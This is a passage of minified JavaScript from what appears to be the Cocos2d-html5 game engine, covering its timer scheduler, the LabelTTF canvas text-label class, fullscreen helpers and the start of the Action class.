        cc.assert(e, cc._LogInfos.Scheduler_scheduleCallbackForTarget_2),
        cc.assert(t, cc._LogInfos.Scheduler_scheduleCallbackForTarget_3),
        i = i || 0,
        n = null == n ? cc.REPEAT_FOREVER: n,
        r = r || 0,
        c = c || !1;
        var o = this._hashForTimers[t.__instanceId];
        if (o || (o = new cc.HashTimerEntry(null, t, 0, null, null, c, null), this._arrayForTimers.push(o), this._hashForTimers[t.__instanceId] = o), null == o.timers) o.timers = [];
        else for (var s = 0; s < o.timers.length; s++) if (c = o.timers[s], e == c._callback) return cc.log(cc._LogInfos.Scheduler_scheduleCallbackForTarget, c.getInterval().toFixed(4), i.toFixed(4)),
        void(c._interval = i);
        c = new cc.Timer(t, e, i, n, r),
        o.timers.push(c)
    },
    scheduleUpdateForTarget: function(t, e, i) {
        if (null !== t) {
            var n = this._updates,
            r = this._hashForUpdates[t.__instanceId];
            r ? r.entry.markedForDeletion = !1 : 0 == e ? this._appendIn(n[1], t, i) : 0 > e ? n[0] = this._priorityIn(n[0], t, e, i) : n[2] = this._priorityIn(n[2], t, e, i)
        }
    },
    unscheduleCallbackForTarget: function(t, e) {
        if (null != t && null != e) {
            var i = this._hashForTimers[t.__instanceId];
            if (i) for (var n = i.timers,
            r = 0,
            c = n.length; c > r; r++) {
                var o = n[r];
                if (e == o._callback) {
                    o == i.currentTimer && !i.currentTimerSalvaged && (i.currentTimerSalvaged = !0),
                    n.splice(r, 1),
                    i.timerIndex >= r && i.timerIndex--,
                    0 == n.length && (this._currentTarget == i ? this._currentTargetSalvaged = !0 : this._removeHashElement(i));
                    break
                }
            }
        }
    },
    unscheduleUpdateForTarget: function(t) {
        null != t && (t = this._hashForUpdates[t.__instanceId], null != t && (this._updateHashLocked ? t.entry.markedForDeletion = !0 : this._removeUpdateFromHash(t.entry)))
    },
    unscheduleAllCallbacksForTarget: function(t) {
        if (null != t) {
            var e = this._hashForTimers[t.__instanceId];
            if (e) {
                var i = e.timers; ! e.currentTimerSalvaged && 0 <= i.indexOf(e.currentTimer) && (e.currentTimerSalvaged = !0),
                i.length = 0,
                this._currentTarget == e ? this._currentTargetSalvaged = !0 : this._removeHashElement(e)
            }
            this.unscheduleUpdateForTarget(t)
        }
    },
    unscheduleAllCallbacks: function() {
        this.unscheduleAllCallbacksWithMinPriority(cc.Scheduler.PRIORITY_SYSTEM)
    },
    unscheduleAllCallbacksWithMinPriority: function(t) {
        for (var e = this._arrayForTimers,
        i = this._updates,
        n = 0,
        r = e.length; r > n; n++) this.unscheduleAllCallbacksForTarget(e[n].target);
        for (n = 2; n >= 0; n--) if (! (1 == n && t > 0 || 0 == n && t >= 0)) for (var e = i[n], r = 0, c = e.length; c > r; r++) this.unscheduleUpdateForTarget(e[r].target)
    },
    pauseAllTargets: function() {
        return this.pauseAllTargetsWithMinPriority(cc.Scheduler.PRIORITY_SYSTEM)
    },
    pauseAllTargetsWithMinPriority: function(t) {
        t = [];
        for (var e, i = this._arrayForTimers,
        n = this._updates,
        r = 0,
        c = i.length; c > r; r++)(e = i[r]) && (e.paused = !0, t.push(e.target));
        for (r = 0, c = n.length; c > r; r++) for (var i = n[r], o = 0, s = i.length; s > o; o++)(e = i[o]) && (e.paused = !0, t.push(e.target));
        return t
    },
    resumeTargets: function(t) {
        if (t) for (var e = 0; e < t.length; e++) this.resumeTarget(t[e])
    },
    pauseTarget: function(t) {
        cc.assert(t, cc._LogInfos.Scheduler_pauseTarget);
        var e = this._hashForTimers[t.__instanceId];
        e && (e.paused = !0),
        (t = this._hashForUpdates[t.__instanceId]) && (t.entry.paused = !0)
    },
    resumeTarget: function(t) {
        cc.assert(t, cc._LogInfos.Scheduler_resumeTarget);
        var e = this._hashForTimers[t.__instanceId];
        e && (e.paused = !1),
        (t = this._hashForUpdates[t.__instanceId]) && (t.entry.paused = !1)
    },
    isTargetPaused: function(t) {
        return cc.assert(t, cc._LogInfos.Scheduler_isTargetPaused),
        (t = this._hashForTimers[t.__instanceId]) ? t.paused: !1
    }
}),
cc.Scheduler.PRIORITY_SYSTEM = -2147483648,
cc._tmp.PrototypeLabelTTF = function() {
    var t = cc.LabelTTF.prototype;
    cc.defineGetterSetter(t, "color", t.getColor, t.setColor),
    cc.defineGetterSetter(t, "opacity", t.getOpacity, t.setOpacity),
    cc.defineGetterSetter(t, "string", t.getString, t.setString),
    cc.defineGetterSetter(t, "textAlign", t.getHorizontalAlignment, t.setHorizontalAlignment),
    cc.defineGetterSetter(t, "verticalAlign", t.getVerticalAlignment, t.setVerticalAlignment),
    cc.defineGetterSetter(t, "fontSize", t.getFontSize, t.setFontSize),
    cc.defineGetterSetter(t, "fontName", t.getFontName, t.setFontName),
    cc.defineGetterSetter(t, "font", t._getFont, t._setFont),
    cc.defineGetterSetter(t, "boundingWidth", t._getBoundingWidth, t._setBoundingWidth),
    cc.defineGetterSetter(t, "boundingHeight", t._getBoundingHeight, t._setBoundingHeight),
    cc.defineGetterSetter(t, "fillStyle", t._getFillStyle, t.setFontFillColor),
    cc.defineGetterSetter(t, "strokeStyle", t._getStrokeStyle, t._setStrokeStyle),
    cc.defineGetterSetter(t, "lineWidth", t._getLineWidth, t._setLineWidth),
    cc.defineGetterSetter(t, "shadowOffsetX", t._getShadowOffsetX, t._setShadowOffsetX),
    cc.defineGetterSetter(t, "shadowOffsetY", t._getShadowOffsetY, t._setShadowOffsetY),
    cc.defineGetterSetter(t, "shadowOpacity", t._getShadowOpacity, t._setShadowOpacity),
    cc.defineGetterSetter(t, "shadowBlur", t._getShadowBlur, t._setShadowBlur)
},
cc.LabelTTF = cc.Sprite.extend({
    _dimensions: null,
    _hAlignment: cc.TEXT_ALIGNMENT_CENTER,
    _vAlignment: cc.VERTICAL_TEXT_ALIGNMENT_TOP,
    _fontName: null,
    _fontSize: 0,
    _string: "",
    _originalText: null,
    _isMultiLine: !1,
    _fontStyleStr: null,
    _shadowEnabled: !1,
    _shadowOffset: null,
    _shadowOpacity: 0,
    _shadowBlur: 0,
    _shadowColorStr: null,
    _strokeEnabled: !1,
    _strokeColor: null,
    _strokeSize: 0,
    _strokeColorStr: null,
    _textFillColor: null,
    _fillColorStr: null,
    _strokeShadowOffsetX: 0,
    _strokeShadowOffsetY: 0,
    _needUpdateTexture: !1,
    _labelCanvas: null,
    _labelContext: null,
    _lineWidths: null,
    _className: "LabelTTF",
    ctor: function(t, e, i, n, r, c) {
        cc.Sprite.prototype.ctor.call(this),
        this._dimensions = cc.size(0, 0),
        this._hAlignment = cc.TEXT_ALIGNMENT_LEFT,
        this._vAlignment = cc.VERTICAL_TEXT_ALIGNMENT_TOP,
        this._opacityModifyRGB = !1,
        this._fontStyleStr = "",
        this._fontName = "Arial",
        this._shadowEnabled = this._isMultiLine = !1,
        this._shadowOffset = cc.p(0, 0),
        this._shadowBlur = this._shadowOpacity = 0,
        this._shadowColorStr = "rgba(128, 128, 128, 0.5)",
        this._strokeEnabled = !1,
        this._strokeColor = cc.color(255, 255, 255, 255),
        this._strokeSize = 0,
        this._strokeColorStr = "",
        this._textFillColor = cc.color(255, 255, 255, 255),
        this._fillColorStr = "rgba(255,255,255,1)",
        this._strokeShadowOffsetY = this._strokeShadowOffsetX = 0,
        this._needUpdateTexture = !1,
        this._lineWidths = [],
        this._setColorsString(),
        e && e instanceof cc.FontDefinition ? this.initWithStringAndTextDefinition(t, e) : cc.LabelTTF.prototype.initWithString.call(this, t, e, i, n, r, c)
    },
    init: function() {
        return this.initWithString(" ", this._fontName, this._fontSize)
    },
    _measureConfig: function() {
        this._getLabelContext().font = this._fontStyleStr
    },
    _measure: function(t) {
        return this._getLabelContext().measureText(t).width
    },
    _checkNextline: function(t, e) {
        var i = this._measure(t),
        n = Math.floor(t.length * e / i),
        r = t.indexOf("\n");
        if (.8 * n >= r && r > 0) return r + 1;
        if (e > i) return t.length;
        for (var c, i = !1,
        o = e + 1,
        r = -1,
        s = n,
        a = cc.LabelTTF._checkRegEx,
        h = cc.LabelTTF._reverseCheckRegEx,
        l = cc.LabelTTF._checkEnRegEx,
        u = t.substr(n); c = a.exec(u);) {
            if (s += c[0].length, o = t.substr(0, s), o = this._measure(o), "\n" == c[2] && e > o) {
                i = !0,
                r = s;
                break
            }
            if (o > e) { - 1 != r && (i = !0);
                break
            }
            r = s,
            u = t.substr(s)
        }
        if (i) return r;
        for (u = t.substr(0, n), r = n; c = h.exec(u);) if (r = c[1].length, u = c[1], o = this._measure(u), e > o) {
            l.test(c[2]) && r++;
            break
        }
        return r || 1
    },
    description: function() {
        return "<cc.LabelTTF | FontName =" + this._fontName + " FontSize = " + this._fontSize.toFixed(1) + ">"
    },
    setColor: null,
    _setColorsString: null,
    updateDisplayedColor: null,
    setOpacity: null,
    updateDisplayedOpacity: null,
    updateDisplayedOpacityForCanvas: function(t) {
        cc.NodeRGBA.prototype.updateDisplayedOpacity.call(this, t),
        this._setColorsString()
    },
    getString: function() {
        return this._string
    },
    getHorizontalAlignment: function() {
        return this._hAlignment
    },
    getVerticalAlignment: function() {
        return this._vAlignment
    },
    getDimensions: function() {
        return cc.size(this._dimensions.width, this._dimensions.height)
    },
    getFontSize: function() {
        return this._fontSize
    },
    getFontName: function() {
        return this._fontName
    },
    initWithString: function(t, e, i, n, r, c) {
        return t = t ? t + "": "",
        i = i || 16,
        n = n || cc.size(0, i),
        r = r || cc.TEXT_ALIGNMENT_LEFT,
        c = c || cc.VERTICAL_TEXT_ALIGNMENT_TOP,
        this._opacityModifyRGB = !1,
        this._dimensions = cc.size(n.width, n.height),
        this._fontName = e || "Arial",
        this._hAlignment = r,
        this._vAlignment = c,
        this._fontSize = i,
        this._fontStyleStr = this._fontSize + "px '" + e + "'",
        this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(e, this._fontSize),
        this.string = t,
        this._setColorsString(),
        this._updateTexture(),
        this._needUpdateTexture = !1,
        !0
    },
    initWithStringAndTextDefinition: null,
    setTextDefinition: function(t) {
        t && this._updateWithTextDefinition(t, !0)
    },
    getTextDefinition: function() {
        return this._prepareTextDefinition(!1)
    },
    enableShadow: function(t, e, i, n) {
        i = i || .5,
        !1 === this._shadowEnabled && (this._shadowEnabled = !0);
        var r = this._shadowOffset; (r && r.x != t || r._y != e) && (r.x = t, r.y = e),
        this._shadowOpacity != i && (this._shadowOpacity = i),
        this._setColorsString(),
        this._shadowBlur != n && (this._shadowBlur = n),
        this._needUpdateTexture = !0
    },
    _getShadowOffsetX: function() {
        return this._shadowOffset.x
    },
    _setShadowOffsetX: function(t) { ! 1 === this._shadowEnabled && (this._shadowEnabled = !0),
        this._shadowOffset.x != t && (this._shadowOffset.x = t, this._needUpdateTexture = !0)
    },
    _getShadowOffsetY: function() {
        return this._shadowOffset._y
    },
    _setShadowOffsetY: function(t) { ! 1 === this._shadowEnabled && (this._shadowEnabled = !0),
        this._shadowOffset._y != t && (this._shadowOffset._y = t, this._needUpdateTexture = !0)
    },
    _getShadowOffset: function() {
        return cc.p(this._shadowOffset.x, this._shadowOffset.y)
    },
    _setShadowOffset: function(t) { ! 1 === this._shadowEnabled && (this._shadowEnabled = !0),
        (this._shadowOffset.x != t.x || this._shadowOffset.y != t.y) && (this._shadowOffset.x = t.x, this._shadowOffset.y = t.y, this._needUpdateTexture = !0)
    },
    _getShadowOpacity: function() {
        return this._shadowOpacity
    },
    _setShadowOpacity: function(t) { ! 1 === this._shadowEnabled && (this._shadowEnabled = !0),
        this._shadowOpacity != t && (this._shadowOpacity = t, this._setColorsString(), this._needUpdateTexture = !0)
    },
    _getShadowBlur: function() {
        return this._shadowBlur
    },
    _setShadowBlur: function(t) { ! 1 === this._shadowEnabled && (this._shadowEnabled = !0),
        this._shadowBlur != t && (this._shadowBlur = t, this._needUpdateTexture = !0)
    },
    disableShadow: function() {
        this._shadowEnabled && (this._shadowEnabled = !1, this._needUpdateTexture = !0)
    },
    enableStroke: function(t, e) { ! 1 === this._strokeEnabled && (this._strokeEnabled = !0);
        var i = this._strokeColor; (i.r !== t.r || i.g !== t.g || i.b !== t.b) && (i.r = t.r, i.g = t.g, i.b = t.b, this._setColorsString()),
        this._strokeSize !== e && (this._strokeSize = e || 0),
        this._needUpdateTexture = !0
    },
    _getStrokeStyle: function() {
        return this._strokeColor
    },
    _setStrokeStyle: function(t) { ! 1 === this._strokeEnabled && (this._strokeEnabled = !0);
        var e = this._strokeColor; (e.r !== t.r || e.g !== t.g || e.b !== t.b) && (e.r = t.r, e.g = t.g, e.b = t.b, this._setColorsString(), this._needUpdateTexture = !0)
    },
    _getLineWidth: function() {
        return this._strokeSize
    },
    _setLineWidth: function(t) { ! 1 === this._strokeEnabled && (this._strokeEnabled = !0),
        this._strokeSize !== t && (this._strokeSize = t || 0, this._needUpdateTexture = !0)
    },
    disableStroke: function() {
        this._strokeEnabled && (this._strokeEnabled = !1, this._needUpdateTexture = !0)
    },
    setFontFillColor: null,
    _getFillStyle: function() {
        return this._textFillColor
    },
    _updateWithTextDefinition: function(t, e) {
        t.fontDimensions ? (this._dimensions.width = t.boundingWidth, this._dimensions.height = t.boundingHeight) : (this._dimensions.width = 0, this._dimensions.height = 0),
        this._hAlignment = t.textAlign,
        this._vAlignment = t.verticalAlign,
        this._fontName = t.fontName,
        this._fontSize = t.fontSize || 12,
        this._fontStyleStr = this._fontSize + "px '" + this._fontName + "'",
        this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(this._fontName, this._fontSize),
        t.shadowEnabled && this.enableShadow(t.shadowOffsetX, t.shadowOffsetY, t.shadowOpacity, t.shadowBlur),
        t.strokeEnabled && this.enableStroke(t.strokeStyle, t.lineWidth),
        this.setFontFillColor(t.fillStyle),
        e && this._updateTexture()
    },
    _prepareTextDefinition: function(t) {
        var e = new cc.FontDefinition;
        if (t ? (e.fontSize = this._fontSize, e.boundingWidth = cc.contentScaleFactor() * this._dimensions.width, e.boundingHeight = cc.contentScaleFactor() * this._dimensions.height) : (e.fontSize = this._fontSize, e.boundingWidth = this._dimensions.width, e.boundingHeight = this._dimensions.height), e.fontName = this._fontName, e.textAlign = this._hAlignment, e.verticalAlign = this._vAlignment, this._strokeEnabled) {
            e.strokeEnabled = !0;
            var i = this._strokeColor;
            e.strokeStyle = cc.color(i.r, i.g, i.b),
            e.lineWidth = this._strokeSize
        } else e.strokeEnabled = !1;
        return this._shadowEnabled ? (e.shadowEnabled = !0, e.shadowBlur = this._shadowBlur, e.shadowOpacity = this._shadowOpacity, e.shadowOffsetX = (t ? cc.contentScaleFactor() : 1) * this._shadowOffset.x, e.shadowOffsetY = (t ? cc.contentScaleFactor() : 1) * this._shadowOffset.y) : e._shadowEnabled = !1,
        t = this._textFillColor,
        e.fillStyle = cc.color(t.r, t.g, t.b),
        e
    },
    _fontClientHeight: 18,
    setString: function(t) {
        t = String(t),
        this._originalText != t && (this._originalText = t + "", this._updateString(), this._needUpdateTexture = !0)
    },
    _updateString: function() {
        this._string = this._originalText
    },
    setHorizontalAlignment: function(t) {
        t !== this._hAlignment && (this._hAlignment = t, this._needUpdateTexture = !0)
    },
    setVerticalAlignment: function(t) {
        t != this._vAlignment && (this._vAlignment = t, this._needUpdateTexture = !0)
    },
    setDimensions: function(t) { (t.width != this._dimensions.width || t.height != this._dimensions.height) && (this._dimensions = t, this._updateString(), this._needUpdateTexture = !0)
    },
    _getBoundingWidth: function() {
        return this._dimensions.width
    },
    _setBoundingWidth: function(t) {
        t != this._dimensions.width && (this._dimensions.width = t, this._updateString(), this._needUpdateTexture = !0)
    },
    _getBoundingHeight: function() {
        return this._dimensions.height
    },
    _setBoundingHeight: function(t) {
        t != this._dimensions.height && (this._dimensions.height = t, this._updateString(), this._needUpdateTexture = !0)
    },
    setFontSize: function(t) {
        this._fontSize !== t && (this._fontSize = t, this._fontStyleStr = t + "px '" + this._fontName + "'", this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(this._fontName, t), this._needUpdateTexture = !0)
    },
    setFontName: function(t) {
        this._fontName && this._fontName != t && (this._fontName = t, this._fontStyleStr = this._fontSize + "px '" + t + "'", this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(t, this._fontSize), this._needUpdateTexture = !0)
    },
    _getFont: function() {
        return this._fontStyleStr
    },
    _setFont: function(t) {
        var e = cc.LabelTTF._fontStyleRE.exec(t);
        e && (this._fontSize = parseInt(e[1]), this._fontName = e[2], this._fontStyleStr = t, this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(this._fontName, this._fontSize), this._needUpdateTexture = !0)
    },
    _drawTTFInCanvas: function(t) {
        if (t) {
            var e = this._strokeShadowOffsetX,
            i = this._strokeShadowOffsetY,
            n = this._contentSize.height - i,
            r = this._vAlignment,
            c = this._hAlignment,
            o = this._fontClientHeight,
            s = this._strokeSize;
            t.setTransform(1, 0, 0, 1, 0 + .5 * e, n + .5 * i),
            t.font != this._fontStyleStr && (t.font = this._fontStyleStr),
            t.fillStyle = this._fillColorStr;
            var a = i = 0,
            h = this._strokeEnabled;
            if (h && (t.lineWidth = 2 * s, t.strokeStyle = this._strokeColorStr), this._shadowEnabled && (s = this._shadowOffset, t.shadowColor = this._shadowColorStr, t.shadowOffsetX = s.x, t.shadowOffsetY = -s.y, t.shadowBlur = this._shadowBlur), t.textBaseline = cc.LabelTTF._textBaseline[r], t.textAlign = cc.LabelTTF._textAlign[c], e = this._contentSize.width - e, i = c === cc.TEXT_ALIGNMENT_RIGHT ? i + e: c === cc.TEXT_ALIGNMENT_CENTER ? i + e / 2 : i + 0, this._isMultiLine) for (c = this._strings.length, r === cc.VERTICAL_TEXT_ALIGNMENT_BOTTOM ? a = o + n - o * c: r === cc.VERTICAL_TEXT_ALIGNMENT_CENTER && (a = o / 2 + (n - o * c) / 2), r = 0; c > r; r++) e = this._strings[r],
            s = -n + o * r + a,
            h && t.strokeText(e, i, s),
            t.fillText(e, i, s);
            else r !== cc.VERTICAL_TEXT_ALIGNMENT_BOTTOM && (a = r === cc.VERTICAL_TEXT_ALIGNMENT_TOP ? a - n: a - .5 * n),
            h && t.strokeText(this._string, i, a),
            t.fillText(this._string, i, a)
        }
    },
    _getLabelContext: function() {
        if (this._labelContext) return this._labelContext;
        if (!this._labelCanvas) {
            var t = cc.newElement("canvas"),
            e = new cc.Texture2D;
            e.initWithElement(t),
            this.texture = e,
            this._labelCanvas = t
        }
        return this._labelContext = this._labelCanvas.getContext("2d")
    },
    _updateTTF: function() {
        var t, e, i = this._dimensions.width,
        n = this._lineWidths;
        if (n.length = 0, this._isMultiLine = !1, this._measureConfig(), 0 !== i) {
            var r = this._string;
            for (this._strings = [], t = 0, e = this._string.length; e > t;) {
                var c = this._checkNextline(r.substr(t), i),
                o = r.substr(t, c);
                this._strings.push(o),
                t += c
            }
        } else for (this._strings = this._string.split("\n"), t = 0, e = this._strings.length; e > t; t++) n.push(this._measure(this._strings[t]));
        0 < this._strings.length && (this._isMultiLine = !0),
        e = t = 0,
        this._strokeEnabled && (t = e = 2 * this._strokeSize),
        this._shadowEnabled && (r = this._shadowOffset, t += 2 * Math.abs(r.x), e += 2 * Math.abs(r.y)),
        i = 0 === i ? this._isMultiLine ? cc.size(0 | Math.max.apply(Math, n) + t, 0 | this._fontClientHeight * this._strings.length + e) : cc.size(0 | this._measure(this._string) + t, 0 | this._fontClientHeight + e) : 0 === this._dimensions.height ? this._isMultiLine ? cc.size(0 | i + t, 0 | this._fontClientHeight * this._strings.length + e) : cc.size(0 | i + t, 0 | this._fontClientHeight + e) : cc.size(0 | i + t, 0 | this._dimensions.height + e),
        this.setContentSize(i),
        this._strokeShadowOffsetX = t,
        this._strokeShadowOffsetY = e,
        n = this._anchorPoint,
        this._anchorPointInPoints.x = .5 * t + (i.width - t) * n.x,
        this._anchorPointInPoints.y = .5 * e + (i.height - e) * n.y
    },
    getContentSize: function() {
        return this._needUpdateTexture && this._updateTTF(),
        cc.Sprite.prototype.getContentSize.call(this)
    },
    _getWidth: function() {
        return this._needUpdateTexture && this._updateTTF(),
        cc.Sprite.prototype._getWidth.call(this)
    },
    _getHeight: function() {
        return this._needUpdateTexture && this._updateTTF(),
        cc.Sprite.prototype._getHeight.call(this)
    },
    _updateTexture: function() {
        var t = this._getLabelContext(),
        e = this._labelCanvas,
        i = this._contentSize;
        if (0 === this._string.length) return e.width = 1,
        e.height = i.height,
        this.setTextureRect(cc.rect(0, 0, 1, i.height)),
        !0;
        t.font = this._fontStyleStr,
        this._updateTTF();
        var n = i.width,
        i = i.height,
        r = e.width == n && e.height == i;
        return e.width = n,
        e.height = i,
        r && t.clearRect(0, 0, n, i),
        this._drawTTFInCanvas(t),
        this._texture && this._texture.handleLoadedTexture(),
        this.setTextureRect(cc.rect(0, 0, n, i)),
        !0
    },
    visit: function(t) {
        this._string && "" != this._string && (this._needUpdateTexture && (this._needUpdateTexture = !1, this._updateTexture()), cc.Sprite.prototype.visit.call(this, t || cc._renderContext))
    },
    draw: null,
    _setTextureCoords: function(t) {
        var e = this._batchNode ? this.textureAtlas.texture: this._texture;
        if (e) {
            var i, n = e.pixelsWidth,
            r = e.pixelsHeight,
            c = this._quad;
            this._rectRotated ? (cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL ? (e = (2 * t.x + 1) / (2 * n), n = e + (2 * t.height - 2) / (2 * n), i = (2 * t.y + 1) / (2 * r), t = i + (2 * t.width - 2) / (2 * r)) : (e = t.x / n, n = (t.x + t.height) / n, i = t.y / r, t = (t.y + t.width) / r), this._flippedX && (r = i, i = t, t = r), this._flippedY && (r = e, e = n, n = r), c.bl.texCoords.u = e, c.bl.texCoords.v = i, c.br.texCoords.u = e, c.br.texCoords.v = t, c.tl.texCoords.u = n, c.tl.texCoords.v = i, c.tr.texCoords.u = n, c.tr.texCoords.v = t) : (cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL ? (e = (2 * t.x + 1) / (2 * n), n = e + (2 * t.width - 2) / (2 * n), i = (2 * t.y + 1) / (2 * r), t = i + (2 * t.height - 2) / (2 * r)) : (e = t.x / n, n = (t.x + t.width) / n, i = t.y / r, t = (t.y + t.height) / r), this._flippedX && (r = e, e = n, n = r), this._flippedY && (r = i, i = t, t = r), c.bl.texCoords.u = e, c.bl.texCoords.v = t, c.br.texCoords.u = n, c.br.texCoords.v = t, c.tl.texCoords.u = e, c.tl.texCoords.v = i, c.tr.texCoords.u = n, c.tr.texCoords.v = i),
            this._quadDirty = !0
        }
    }
}),
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.LabelTTF.prototype, _p.setColor = function(t) {
    cc.NodeRGBA.prototype.setColor.call(this, t),
    this._setColorsString()
},
_p._setColorsString = function() {
    this._needUpdateTexture = !0;
    var t = this._displayedColor,
    e = this._displayedOpacity,
    i = this._strokeColor,
    n = this._textFillColor;
    this._shadowColorStr = "rgba(" + (0 | .5 * t.r) + "," + (0 | .5 * t.g) + "," + (0 | .5 * t.b) + "," + this._shadowOpacity + ")",
    this._fillColorStr = "rgba(" + (0 | t.r / 255 * n.r) + "," + (0 | t.g / 255 * n.g) + "," + (0 | t.b / 255 * n.b) + ", " + e / 255 + ")",
    this._strokeColorStr = "rgba(" + (0 | t.r / 255 * i.r) + "," + (0 | t.g / 255 * i.g) + "," + (0 | t.b / 255 * i.b) + ", " + e / 255 + ")"
},
_p.updateDisplayedColor = function(t) {
    cc.NodeRGBA.prototype.updateDisplayedColor.call(this, t),
    this._setColorsString()
},
_p.setOpacity = function(t) {
    this._opacity !== t && (cc.Sprite.prototype.setOpacity.call(this, t), this._setColorsString(), this._needUpdateTexture = !0)
},
_p.updateDisplayedOpacity = cc.Sprite.prototype.updateDisplayedOpacity, _p.initWithStringAndTextDefinition = function(t, e) {
    return this._updateWithTextDefinition(e, !1),
    this.string = t,
    !0
},
_p.setFontFillColor = function(t) {
    var e = this._textFillColor; (e.r != t.r || e.g != t.g || e.b != t.b) && (e.r = t.r, e.g = t.g, e.b = t.b, this._setColorsString(), this._needUpdateTexture = !0)
},
_p.draw = cc.Sprite.prototype.draw, _p.setTextureRect = function(t, e, i) {
    this._rectRotated = e || !1,
    this.setContentSize(i || t),
    this.setVertexRect(t),
    e = this._textureRect_Canvas,
    e.x = t.x,
    e.y = t.y,
    e.width = t.width,
    e.height = t.height,
    e.validRect = !(0 === e.width || 0 === e.height || 0 > e.x || 0 > e.y),
    t = this._unflippedOffsetPositionFromCenter,
    this._flippedX && (t.x = -t.x),
    this._flippedY && (t.y = -t.y),
    this._offsetPosition.x = t.x + (this._contentSize.width - this._rect.width) / 2,
    this._offsetPosition.y = t.y + (this._contentSize.height - this._rect.height) / 2,
    this._batchNode && (this.dirty = !0)
},
_p = null) : (cc.assert("function" == typeof cc._tmp.WebGLLabelTTF, cc._LogInfos.MissingFile, "LabelTTFWebGL.js"), cc._tmp.WebGLLabelTTF(), delete cc._tmp.WebGLLabelTTF),
cc.assert("function" == typeof cc._tmp.PrototypeLabelTTF, cc._LogInfos.MissingFile, "LabelTTFPropertyDefine.js"),
cc._tmp.PrototypeLabelTTF(),
delete cc._tmp.PrototypeLabelTTF,
cc.LabelTTF._textAlign = ["left", "center", "right"],
cc.LabelTTF._textBaseline = ["top", "middle", "bottom"],
cc.LabelTTF._checkRegEx = /(.+?)([\s\n\r\-\/\\\:]|[一-龥]|[︰-ﾠ])/,
cc.LabelTTF._reverseCheckRegEx = /(.*)([\s\n\r\-\/\\\:]|[一-龥]|[︰-ﾠ])/,
cc.LabelTTF._checkEnRegEx = /[\s\-\/\\\:]/,
cc.LabelTTF._fontStyleRE = /^(\d+)px\s+['"]?([\w\s\d]+)['"]?$/,
cc.LabelTTF.create = function(t, e, i, n, r, c) {
    return new cc.LabelTTF(t, e, i, n, r, c)
},
cc.LabelTTF._SHADER_PROGRAM = cc.USE_LA88_LABELS ? cc.SHADER_POSITION_TEXTURECOLOR: cc.SHADER_POSITION_TEXTUREA8COLOR,
cc.LabelTTF.__labelHeightDiv = cc.newElement("div"),
cc.LabelTTF.__labelHeightDiv.style.fontFamily = "Arial",
cc.LabelTTF.__labelHeightDiv.style.position = "absolute",
cc.LabelTTF.__labelHeightDiv.style.left = "-100px",
cc.LabelTTF.__labelHeightDiv.style.top = "-100px",
cc.LabelTTF.__labelHeightDiv.style.lineHeight = "normal",
document.body ? document.body.appendChild(cc.LabelTTF.__labelHeightDiv) : cc._addEventListener(window, "load",
function() {
    this.removeEventListener("load", arguments.callee, !1),
    document.body.appendChild(cc.LabelTTF.__labelHeightDiv)
},
!1),
cc.LabelTTF.__getFontHeightByDiv = function(t, e) {
    var i = cc.LabelTTF.__fontHeightCache[t + "." + e];
    if (i > 0) return i;
    var n = cc.LabelTTF.__labelHeightDiv;
    return n.innerHTML = "ajghl~!",
    n.style.fontFamily = t,
    n.style.fontSize = e + "px",
    i = n.clientHeight,
    cc.LabelTTF.__fontHeightCache[t + "." + e] = i,
    n.innerHTML = "",
    i
},
cc.LabelTTF.__fontHeightCache = {},
cc.screen = {
    _supportsFullScreen: !1,
    _preOnFullScreenChange: null,
    _touchEvent: "",
    _fn: null,
    _fnMap: [["requestFullscreen", "exitFullscreen", "fullscreenchange", "fullscreenEnabled", "fullscreenElement"], ["requestFullScreen", "exitFullScreen", "fullScreenchange", "fullScreenEnabled", "fullScreenElement"], ["webkitRequestFullScreen", "webkitCancelFullScreen", "webkitfullscreenchange", "webkitIsFullScreen", "webkitCurrentFullScreenElement"], ["mozRequestFullScreen", "mozCancelFullScreen", "mozfullscreenchange", "mozFullScreen", "mozFullScreenElement"], ["msRequestFullscreen", "msExitFullscreen", "MSFullscreenChange", "msFullscreenEnabled", "msFullscreenElement"]],
    init: function() {
        this._fn = {};
        var t, e, i, n = this._fnMap;
        for (t = 0, l = n.length; l > t; t++) if (e = n[t], e && e[1] in document) {
            for (t = 0, i = e.length; i > t; t++) this._fn[n[0][t]] = e[t];
            break
        }
        this._supportsFullScreen = void 0 != this._fn.requestFullscreen,
        this._touchEvent = "ontouchstart" in window ? "touchstart": "mousedown"
    },
    fullScreen: function() {
        return this._supportsFullScreen && document[this._fn.fullscreenEnabled]
    },
    requestFullScreen: function(t, e) {
        if (this._supportsFullScreen) {
            if (t = t || document.documentElement, t[this._fn.requestFullscreen](), e) {
                var i = this._fn.fullscreenchange;
                this._preOnFullScreenChange && document.removeEventListener(i, this._preOnFullScreenChange),
                this._preOnFullScreenChange = e,
                cc._addEventListener(document, i, e, !1)
            }
            return t[this._fn.requestFullscreen]()
        }
    },
    exitFullScreen: function() {
        return this._supportsFullScreen ? document[this._fn.exitFullscreen]() : !0
    },
    autoFullScreen: function(t, e) {
        function i() {
            r.requestFullScreen(t, e),
            n.removeEventListener(r._touchEvent, i)
        }
        t = t || document.body;
        var n = cc._canvas || t,
        r = this;
        this.requestFullScreen(t, e),
        cc._addEventListener(n, this._touchEvent, i)
    }
},
cc.screen.init(),
cc.ACTION_TAG_INVALID = -1,
cc.Action = cc.Class.extend({
    originalTarget: null,
    target: null,
    tag: cc.ACTION_TAG_INVALID,
    ctor: function() {
        this.originalTarget = null,
        this.target = null,
        this.tag = cc.ACTION_TAG_INVALID
    },
    copy: function() {
        return cc.log("copy is deprecated. Please use clone instead."),
        this.clone()
    },
    clone: function() {
        var t = new cc.Action;
        return t.originalTarget = null,
        t.target = null,
        t.tag = this.tag,
        t
    },
    isDone: function() {
        return ! 0
    },
    startWithTarget: function(t) {
        this.originalTarget = t,
        this.target = t
    },
    stop: function() {
        this.target = null
    },
    step: function() {
        cc.log("[Action step]. override me")
    },
    update: function() {
        cc.log("[Action update]. override me")
    },
    getTarget: function() {
        return this.target
    },
    setTarget: function(t) {
        this.target = t
    },
    getOriginalTarget: function() {
        return this.originalTarget
    },
    setOriginalTarget: function(t) {
        this.originalTarget = t
    },
